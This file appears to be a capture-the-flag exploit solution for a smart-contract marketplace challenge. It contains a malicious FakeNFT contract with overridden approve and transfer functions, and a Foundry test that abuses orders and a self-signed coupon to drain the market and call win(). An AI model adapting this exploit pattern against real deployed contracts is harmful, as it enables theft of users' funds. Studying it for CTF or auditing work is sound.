// FakeNFT for attack
 
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;
 
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./Task.sol";
 
 
contract FakeNFT is ERC721 {
    uint256 called = 0;
    uint256 approved = 0;
    TctfMarket market;
    TctfToken token;
 
    constructor() ERC721("FakeNFT", "FNFT") {
        _setApprovalForAll(address(this), msg.sender, true);
    }
 
    function getParams(address t1, address t2) public {
        market = TctfMarket(t1);
        token = TctfToken(t2);
    }
 
    function mint(address to, uint256 tokenId) external {
        _mint(to, tokenId);
    }
 
    function approve(address dest, uint256 tokenId) public override {
        if(approved == 0) {
            super.safeTransferFrom(msg.sender, USER, 1); // sqrtrev's code: he hardcoded USER here
        } else {
            super.approve(dest, tokenId);
        }
        approved += 1;
    }
 
    function safeTransferFrom(address, address, uint256) public override {
        
    }
}
 
// foundry testing
 
function setUp() public {
    vm.label(user, "user");
    vm.label(deployer, "deployer");
    vm.startPrank(deployer, deployer);
    market = new TctfMarket();
    vm.stopPrank();
 
    token = market.tctfToken();
    NFT = market.tctfNFT();
}
 
function testExploit() public {
    vm.startPrank(user);
    fakeNFT = new FakeNFT();
 
    emit log_address(address(fakeNFT));
 
    Coupon memory coupon;
    Signature memory signature;
    SignedCoupon memory scoupon;
    Order memory order;
 
    token.airdrop(); // get 5 tokens
 
    fakeNFT.mint(address(market), 1);
    market.purchaseTest(address(fakeNFT), 1, 1337);
 
    token.approve(address(market), 1337 + 5);
 
    fakeNFT.mint(user, 2);
    fakeNFT.approve(address(fakeNFT), 2);
 
    market.createOrder(address(fakeNFT), 2, 1);
    market.purchaseOrder(0); 
    market.purchaseOrder(1);
 
    coupon.orderId = 1;
    coupon.newprice = 1;
    coupon.issuer = user;
    coupon.user = user;
    coupon.reason = "rkm0959";
 
    order = market.getOrder(0);
 
    bytes memory serialized = abi.encode(
        "I, the issuer", coupon.issuer,
        "offer a special discount for", coupon.user,
        "to buy", order, "at", coupon.newprice,
        "because", coupon.reason
    );
 
    (signature.v, signature.rs[0], signature.rs[1]) = vm.sign(pvk, keccak256(serialized)); // pvk = user's private key
 
    scoupon.coupon = coupon;
    scoupon.signature = signature;
 
    emit log_uint(uint256(signature.v));
    emit log_bytes32(signature.rs[0]);
    emit log_bytes32(signature.rs[1]);
    
    market.purchaseWithCoupon(scoupon);
 
    market.win();
}
